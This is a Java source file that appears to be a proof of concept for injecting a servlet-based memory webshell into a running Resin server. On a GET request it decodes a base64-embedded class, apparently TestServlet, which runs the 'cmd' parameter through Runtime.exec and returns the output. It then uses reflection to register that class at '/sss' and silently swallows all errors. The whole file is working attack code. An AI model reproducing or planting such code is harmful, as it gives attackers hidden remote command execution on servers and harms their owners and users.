package com.axisx;

import sun.misc.BASE64Decoder;

import javax.servlet.Servlet;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Method;

public class InjectServletByServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try{
            ClassLoader classLoader=Thread.currentThread().getContextClassLoader();
            Class servletInvocation=classLoader.loadClass("com.caucho.server.dispatch.ServletInvocation");

            Object contextRequest = servletInvocation.getMethod("getContextRequest").invoke(null);
            Object webapp = contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);

            // 此servlet传入参数为servlet
            String ServletBase64 = "yv66vgAAADQAkAoAHABYBwBZBwBaCABbCwACAFwKABsAXQsAAwBeCgBfAGAHAGEKAGIAYwoAYgBkCgBlAGYHAGcKAA0AaAcAaQoADwBqBwBrCgARAFgKAA8AbAcAbQoAFABYCgAUAG4IAG8KABQAcAoAEQBxCgARAHAHAHIHAHMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEADUxUZXN0U2VydmxldDsBAARpbml0AQAgKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7KVYBAA1zZXJ2bGV0Q29uZmlnAQAdTGphdmF4L3NlcnZsZXQvU2VydmxldENvbmZpZzsBAApFeGNlcHRpb25zBwB0AQAHc2VydmljZQEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYBAAZyZXN1bHQBABJMamF2YS9sYW5nL1N0cmluZzsBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAANyZXEBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAARyZXNwAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAA2NtZAEADVN0YWNrTWFwVGFibGUHAHIHAHUHAHYHAFkHAFoHAHcHAGEHAHgBAAtDb21tYW5kRXhlYwEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQACcnQBABNMamF2YS9sYW5nL1J1bnRpbWU7AQAEcHJvYwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAZzdGRlcnIBABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANpc3IBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAAJzYgEAGExqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwcAeQcAegcAewcAZwcAaQcAawEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAQVGVzdFNlcnZsZXQuamF2YQwAHQAeAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAHc2VydmxldAwAfABBDABAAEEMAH0AfgcAfwwAgACBAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAeQwAggCDDACEAIUHAHoMAIYAhwEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIMAB0AiAEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIMAB0AiQEAFmphdmEvbGFuZy9TdHJpbmdCdWZmZXIMAIoAiwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDACMAI0BAAEKDACOAIsMAIwAjwEAC1Rlc3RTZXJ2bGV0AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0AQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAQamF2YS9sYW5nL1N0cmluZwEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JbnB1dFN0cmVhbQEADGdldFBhcmFtZXRlcgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsAIQAbABwAAAAAAAUAAQAdAB4AAQAfAAAALwABAAEAAAAFKrcAAbEAAAACACAAAAAGAAEAAAANACEAAAAMAAEAAAAFACIAIwAAAAEAJAAlAAIAHwAAADUAAAACAAAAAbEAAAACACAAAAAGAAEAAAAOACEAAAAWAAIAAAABACIAIwAAAAAAAQAmACcAAQAoAAAABAABACkAAQAqACsAAgAfAAAA3gACAAcAAAAvK8AAAk4swAADOgQtEgS5AAUCADoFKhkFtgAGOgYZBLkABwEAGQa2AAinAAU6BrEAAQAVACkALAAJAAMAIAAAACIACAAAABEABQASAAsAEwAVABUAHQAWACkAGQAsABcALgAaACEAAABIAAcAHQAMACwALQAGAAAALwAiACMAAAAAAC8ALgAvAAEAAAAvADAAMQACAAUAKgAyADMAAwALACQANAA1AAQAFQAaADYALQAFADcAAAAfAAL/ACwABgcAOAcAOQcAOgcAOwcAPAcAPQABBwA+AQAoAAAABgACACkAPwABAEAAQQACAB8AAAEpAAMACQAAAGC4AApNLCu2AAtOLbYADDoEuwANWRkEtwAOOgW7AA9ZGQW3ABA6BgE6B7sAEVm3ABI6CBkGtgATWToHxgAgGQi7ABRZtwAVGQe2ABYSF7YAFrYAGLYAGVen/9sZCLYAGrAAAAADACAAAAAqAAoAAAAcAAQAHQAKAB4AEAAfABsAIAAmACEAKQAiADIAIwA9ACQAWgAmACEAAABcAAkAAABgACIAIwAAAAAAYAA2AC0AAQAEAFwAQgBDAAIACgBWAEQARQADABAAUABGAEcABAAbAEUASABJAAUAJgA6AEoASwAGACkANwBMAC0ABwAyAC4ATQBOAAgANwAAACUAAv8AMgAJBwA4BwA9BwBPBwBQBwBRBwBSBwBTBwA9BwBUAAAnACgAAAAEAAEACQABAFUAHgABAB8AAAArAAAAAQAAAAGxAAAAAgAgAAAABgABAAAAKAAhAAAADAABAAAAAQAiACMAAAABAFYAAAACAFc=";
            byte[] ServletClassByte = new BASE64Decoder().decodeBuffer(ServletBase64);
            Method defineClass = classLoader.getClass().getSuperclass().getDeclaredMethod("loadClass", String.class, byte[].class);
            defineClass.setAccessible(true);
            Class ServletClass = (Class)defineClass.invoke(classLoader, "TestServlet",ServletClassByte);
            Servlet servlet_class=(Servlet)ServletClass.newInstance();

            Class ServletMappingCls = classLoader.loadClass("com.caucho.server.dispatch.ServletMapping");
            Object ServletMapping=ServletMappingCls.newInstance();

            Method m1=ServletMapping.getClass().getSuperclass().getDeclaredMethod("setServletName",String.class);
            m1.setAccessible(true);
            m1.invoke(ServletMapping,"TestServlet");

            Method m2=ServletMapping.getClass().getSuperclass().getDeclaredMethod("setServletClass",String.class);
            m2.setAccessible(true);
            m2.invoke(ServletMapping,"TestServlet");

            Method m3=ServletMapping.getClass().getSuperclass().getDeclaredMethod("setServletClass", Class.class);
            m3.setAccessible(true);
            m3.invoke(ServletMapping,ServletClass);


            Method m5=ServletMapping.getClass().getDeclaredMethod("addURLPattern",String.class);
            m5.setAccessible(true);
            Object o5=m5.invoke(ServletMapping,"/sss");

            Method m4=webapp.getClass().getDeclaredMethod("addServletMapping", com.caucho.server.dispatch.ServletMapping.class);
            m4.setAccessible(true);
            m4.invoke(webapp,ServletMapping);


        }catch (Exception e){}
    }
}
